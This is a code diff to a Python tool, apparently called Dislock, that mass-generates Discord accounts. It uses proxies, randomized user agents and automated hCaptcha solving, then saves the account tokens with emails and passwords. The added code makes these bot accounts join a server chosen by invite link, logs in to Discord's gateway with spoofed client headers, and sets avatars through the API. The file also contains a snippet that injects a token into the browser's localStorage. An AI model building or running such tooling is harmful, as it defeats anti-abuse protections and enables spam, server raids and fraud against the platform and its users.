@@ -7,6 +7,10 @@ import re
 import time
 import tempfile
 import traceback
+import json
+import base64
+import websocket
+import sys
 
 # Pip Install Packages
 import numpy as np
@@ -17,6 +21,7 @@ from playwright.async_api import async_playwright
 from random_user_agent.user_agent import UserAgent
 from random_user_agent.params import SoftwareName, OperatingSystem
 import discum
+import validators
 
 # Imports from Files
 from hcaptcha_challenger import (DIR_CHALLENGE, DIR_MODEL, PATH_OBJECTS_YAML,
@@ -150,9 +155,9 @@ class Proxy:
 
     def check_proxy(self):
         try:
-            ip_request = requests.get('https://api.my-ip.io/ip',
+            ip_request = requests.get('https://jsonip.com',
                                       proxies=self.httpx_proxy)
-            ip = ip_request.text
+            ip = ip_request.json().get("ip")
             r = requests.get(f"http://ip-api.com/json/{ip}")
             data = r.json()
             self.country = data.get("country")
@@ -172,10 +177,11 @@ class Proxy:
 
 
 class Generator:
-    async def initialize(self, proxy, mode=None, output_file="output.txt", email=True, humanize=True, output_format="token:email:pass"):
+    async def initialize(self, proxy, mode=None, output_file="output.txt", email=True, humanize=True, output_format="token:email:pass", invite_link=""):
         # Initializing the Thread
         self.last_x, self.last_y = 0, 0
-        self.proxy, self.mode, self.output_file, self.email_verification, self.humanize, self.output_format = proxy, mode, output_file, email, humanize, output_format
+        self.proxy, self.mode, self.output_file, self.output_format = proxy, mode, output_file, output_format
+        self.email_verification, self.humanize, self.invite_link = email, humanize, invite_link
         self.token, self.email, self.output = "", "", ""
         # SettingUp Logger
         logging.basicConfig(
@@ -220,7 +226,7 @@ class Generator:
         # Starting Playwright
         self.playwright = await async_playwright().start()
         # Launching Firefox with Human Emulation
-        main_browser = await self.playwright.firefox.launch(devtools=True, headless=False, proxy=self.browser_proxy if self.proxy else None)
+        main_browser = await self.playwright.firefox.launch(args=["incognito"], headless=False, proxy=self.browser_proxy if self.proxy else None)
         # Context for more options
         browser = await main_browser.new_context(
             locale="en-US",  # self.faker.locale
@@ -671,6 +677,9 @@ class Generator:
             if self.humanize:
                 await self.humanize_token()
 
+            if self.invite_link:
+                await self.join_server()
+
             self.log_output()
             with open(self.output_file, 'a') as file:
                 file.write(f"{self.output}\n")
@@ -775,6 +784,9 @@ class Generator:
             if self.humanize:
                 await self.humanize_token()
 
+            if self.invite_link:
+                await self.join_server()
+
             self.log_output()
             with open(self.output_file, 'a') as file:
                 file.write(f"{self.output}\n")
@@ -824,26 +836,57 @@ class Generator:
 
         return not token_check
 
+    async def setAvatar(self, base_img):
+        ws = websocket.WebSocket()
+        ws.connect("wss://gateway.discord.gg/?v=6&encoding=json")
+
+        auth = {"op": 2, "d": {"token": self.token, "properties": {
+            "$os": sys.platform, "$browser": "RTB", "$device": f"{sys.platform} Device"}}, "s": None, "t": None}
+        ws.send(json.dumps(auth))
+        ws.send(json.dumps({"op": 1, "d": None}))
+
+        headers = {"User-Agent": self.bot._Client__user_agent,
+                   "Authorization": self.token,
+                   "X-Context-Properties": "eyJsb2NhdGlvbiI6IlJlZ2lzdGVyIn0=",
+                   "X-Debug-Options": "bugReporterEnabled",
+                   "X-Discord-Locale": "en-US",
+                   "X-Super-Properties": base64.b64encode(str(self.bot._Client__super_properties).encode('utf-8'))}
+
+        cookies = requests.get(
+            "https://discord.com/register").cookies.get_dict()
+        data = {"avatar": f"data:image/jpg;base64,{base_img}"}
+
+        r = requests.patch('https://discord.com/api/v9/users/@me',
+                           json=data, headers=headers, cookies=cookies)
+        print(r.json())
+        return r.json().get("avatar")
+
     async def humanize_token(self):
         self.logger.info("Humanizing Token...")
 
         # Setting Random Avatar
-        with tempfile.NamedTemporaryFile(delete=False, suffix=".png") as tmp:
-            pics = requests.get(
-                "https://api.github.com/repos/itschasa/Discord-Scraped/git/trees/cbd70ab66ea1099d31d333ab75e3682fd2a80cff")
-            random_pic = random.choice(pics.json().get("tree")).get("path")
-            pic_url = f"https://raw.githubusercontent.com/itschasa/Discord-Scraped/main/avatars/{random_pic}"
-            pic = requests.get(pic_url)
-            tmp.write(pic.content)
-            tmp.seek(0)
+        pics = requests.get(
+            "https://api.github.com/repos/itschasa/Discord-Scraped/git/trees/cbd70ab66ea1099d31d333ab75e3682fd2a80cff")
 
-            response = self.bot.setAvatar(tmp.name)
-            if "Unknown Session" in str(response.text):
-                self.logger.warning("Coulnt set Pfp!")
+        random_pic = random.choice(pics.json().get("tree")).get("path")
+        pic_url = f"https://raw.githubusercontent.com/itschasa/Discord-Scraped/main/avatars/{random_pic}"
+        pic = requests.get(pic_url).content
+
+        base_img = base64.b64encode(pic).decode()
+        avatar = await self.setAvatar(base_img)
+        if not avatar:
+            self.logger.warning("Couldnt set Avatar!")
+        else:
+            self.logger.info(f"Set Avatar {avatar} successfully!")
 
         # Setting AboutME
-        quote = requests.get("https://free-quotes-api.herokuapp.com")
-        quote = quote.json().get("quote")
+        try:
+            quote = requests.get("https://free-quotes-api.herokuapp.com")
+            quote = quote.json().get("quote")
+        except:
+            self.logger.warning(
+                'Couldnt Get a Random Quote, Setting "Dislock" as AboutMe')
+            quote = "Dislock"
         self.bot.setAboutMe(quote)
 
         # Setting Hypesquad
@@ -917,8 +960,47 @@ class Generator:
             await asyncio.sleep(2)
         return True
 
+    async def join_server(self):
+        await self.page.goto("https://discord.com/channels/@me")
+        await self.page.wait_for_timeout(1000)
+        # Clicking Join Server Button
+        await self.click_humanly("", '[data-list-item-id *= "create-join-button"]')
+        # Click Join another Server Button
+        await self.page.wait_for_timeout(500)
+        await self.click_humanly("", '[class *= "footerButton-24QPis"]')
+        # Type Invite Code
+        await self.page.wait_for_timeout(1000)
+        await self.type_humanly("[placeholder='https://discord.gg/hTKzmak']", self.invite_link)
+        # Clicking Join Server Button
+        # Todo: Bad Code
+        await self.click_humanly("", '[class = "button-f2h6uQ lookFilled-yCfaCM colorBrand-I6CyqQ sizeMedium-2bFIHr grow-2sR_-F"]')
+
+        # Collecting all Images requested from hCaptcha (Captcha Images)
+        self.images = []
+
+        async def image_append(route, request):
+            if request.resource_type == "image" and "hcaptcha" in request.url:
+                self.images.append(request.url)
+            await route.continue_()
+        await self.page.route("https://imgs.hcaptcha.com/*", image_append)
+        # Clicking Captcha Checkbox
+        try:
+            self.checkbox = self.page.frame_locator(
+                '[title *= "hCaptcha security challenge"]').locator('[id="checkbox"]')
+            await self.checkbox.scroll_into_view_if_needed(timeout=10000)
+        except:
+            self.logger.info("No ServerJoin Captcha was detected!")
+            return True
+        await self.click_humanly(self.checkbox, "")
+        await self.page.wait_for_timeout(2000)
+        captcha = await self.captcha_solver()
+
+        return True
+
     # Testing (Maybe used later?)
     async def login_token(self):
+        # self.bot = discum.Client(
+        #     token=self.token, log=False, user_agent=self.faker.useragent, proxy=self.proxy.http_proxy if self.proxy.proxy else None)
         # Going on Discord Register Site
         try:
             await self.page.goto("https://discord.com/register")
@@ -927,15 +1009,15 @@ class Generator:
             return False
         await self.page.evaluate(str('setInterval(() => {document.body.appendChild(document.createElement `iframe`).contentWindow.localStorage.token = `"' + self.token + '"`}, 2500); setTimeout(() => {location.reload();}, 2500);'))
         await self.page.wait_for_timeout(5000)
-        # self.logger.info("Claiming Account...")
-        # claim = await self.claim_account()
-        # if not claim:
-        #     return False
-        # self.logger.info("Verifying email...")
-        # email_v = await self.confirm_email()
-        # self.logger.info(self.token)
-        await self.humanize_token()
+        # self.humanize_token()
+
+        if self.invite_link:
+            await self.join_server()
+
+        await self.page.wait_for_timeout(10000)
+
         await self.close()
+        exit()
 
 
 async def main():
@@ -1008,6 +1090,19 @@ async def main():
     else:
         output_file = "output.txt"
 
+    invite = input("[Input] - [Invite Link]\n" +
+                   "<?> Either parse a InviteLink, or an InviteCode\n" + "</> ")
+
+    if not validators.url(invite) and invite:
+        invite_link = f"https://discord.gg/{invite}"
+        if not validators.url(invite_link) or not requests.get(f"https://discordapp.com/api/v8/invites/{invite}").ok:
+            raise ValueError(f"Invalid InviteLink: {invite}")
+    else:
+        invite_code = invite.split("/")[-1]
+        if invite and not requests.get(f"https://discordapp.com/api/v8/invites/{invite_code}").ok:
+            raise ValueError(f"Invalid InviteLink: {invite}")
+        invite_link = invite
+
     output_format = input("[Input] - [Output Format]\n" +
                           "<?> Token: token, Email: email, Password: pass, Proxy: proxy\n" +
                           "<?> Leave empty for standart output: token:email:pass\n" + "</> ")
@@ -1024,7 +1119,7 @@ async def main():
         for _ in range(threads):
             proxy = random.choice(proxies) if proxies else None
             threadz.append(Generator().initialize(
-                proxy, mode, output_file, email, humanize))
+                proxy, mode, output_file, email, humanize, output_format, invite_link))
 
         await asyncio.gather(*threadz)
         await asyncio.sleep(2)
